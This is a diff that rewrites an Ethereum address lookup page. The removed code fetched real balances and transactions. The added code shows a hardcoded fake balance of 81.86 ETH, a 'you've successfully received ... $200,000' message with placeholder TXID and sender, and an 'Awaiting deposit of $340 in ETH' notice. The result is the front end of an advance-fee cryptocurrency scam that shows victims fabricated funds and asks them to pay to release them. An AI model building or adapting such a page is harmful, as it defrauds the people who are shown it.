@@ -1,84 +1,114 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Ethereum Address Lookup</title>
-    <style>
-        body {
-            background-color: #1e1e1e;
-            color: white;
-            font-family: Arial, sans-serif;
-            margin: 0;
-            padding: 20px;
-        }
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ethereum Address Lookup</title>
+    <style>
+        body {
+            background-color: #f4f4f4;
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-        .container {
-            max-width: 600px;
-            margin: auto;
-            text-align: center;
-        }
+        .container {
+            background-color: #ffffff;
+            border-radius: 10px;
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.1);
+            padding: 30px;
+            width: 400px;
+            text-align: center;
+        }
 
-        input {
-            padding: 10px;
-            margin: 10px 0;
-            width: 80%;
-        }
+        h1 {
+            color: #333;
+            margin-bottom: 20px;
+        }
 
-        button {
-            padding: 10px 20px;
-            background-color: #007bff;
-            color: white;
-            border: none;
-            cursor: pointer;
-        }
+        input {
+            padding: 10px;
+            margin: 10px 0;
+            width: 100%;
+            border: 1px solid #ccc;
+            border-radius: 5px;
+        }
 
-        button:hover {
-            background-color: #0056b3;
-        }
+        button {
+            padding: 10px 20px;
+            background-color: #007bff;
+            color: white;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
 
-        #result {
-            margin-top: 20px;
-        }
-    </style>
+        button:hover {
+            background-color: #0056b3;
+        }
+
+        #result {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .details {
+            display: none;
+            margin-top: 20px;
+            background-color: #f8f9fa;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #e9ecef;
+        }
+
+        .awaiting-deposit {
+            margin-top: 10px;
+            color: #ffc107; /* Warning color */
+        }
+
+        .balance {
+            font-size: 24px;
+            font-weight: bold;
+            color: #28a745; /* Success color */
+        }
+    </style>
 </head>
 <body>
-    <div class="container">
-        <h1>Ethereum Address Lookup</h1>
-        <input type="text" id="ethAddress" placeholder="Enter Ethereum Address">
-        <button id="lookupButton">Lookup</button>
-        <div id="result">
-            <h2>Balance: <span id="balance"></span> ETH</h2>
-            <h3>Transactions:</h3>
-            <ul id="transactions"></ul>
-        </div>
-    </div>
-    <script src="https://cdn.jsdelivr.net/npm/ethers/dist/ethers.umd.min.js"></script>
-    <script>
-        document.getElementById('lookupButton').addEventListener('click', async () => {
-            const address = document.getElementById('ethAddress').value;
-            const provider = new ethers.providers.EtherscanProvider(); // Use Etherscan API
+    <div class="container">
+        <h1>Ethereum Address Lookup</h1>
+        <input type="text" id="ethAddress" placeholder="Enter Ethereum Address" value="0x1AD36967ab3811104d23C1C1d997AB5743843A4F">
+        <button id="lookupButton">Lookup</button>
+        <div id="result">
+            <h2>Balance: <span class="balance" id="balance">81.86</span> ETH</h2>
+            <button id="viewDetailsButton">View Details</button>
+            <div id="transactionDetails" class="details">
+                <p>Dear User, you’ve successfully received <strong>81.86 ETH</strong> (approximately <strong>$200,000</strong>)</p>
+                <p>Transaction Time: <strong>${new Date().toLocaleString()}</strong></p>
+                <p>TXID: <strong>0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef</strong></p>
+                <p>From Address: <strong>0xabcdefabcdefabcdefabcdefabcdefabcdefabcdef</strong></p>
+            </div>
+            <div class="awaiting-deposit">
+                <p>Awaiting deposit of <strong>$340</strong> in ETH.</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        document.getElementById('lookupButton').addEventListener('click', () => {
+            // Simulate balance and transactions
+            document.getElementById('balance').innerText = "81.86";
+            document.getElementById('result').style.display = "block";
+            document.querySelector('.awaiting-deposit').style.display = "block";
+        });
 
-            try {
-                const balance = await provider.getBalance(address);
-                const balanceInEth = ethers.utils.formatEther(balance);
-                document.getElementById('balance').innerText = balanceInEth;
-
-                // Fetch transactions
-                const transactions = await provider.getHistory(address);
-                const transactionsList = document.getElementById('transactions');
-                transactionsList.innerHTML = ''; // Clear previous results
-
-                transactions.forEach(tx => {
-                    const listItem = document.createElement('li');
-                    listItem.innerText = `Hash: ${tx.hash}, Value: ${ethers.utils.formatEther(tx.value)} ETH`;
-                    transactionsList.appendChild(listItem);
-                });
-            } catch (error) {
-                console.error(error);
-                alert('Error fetching data. Please check the address and try again.');
-            }
-        });
-    </script>
+        document.getElementById('viewDetailsButton').addEventListener('click', () => {
+            const details = document.getElementById('transactionDetails');
+            details.style.display = details.style.display === 'none' ? 'block' : 'none';
+        });
+    </script>
 </body>
 </html>
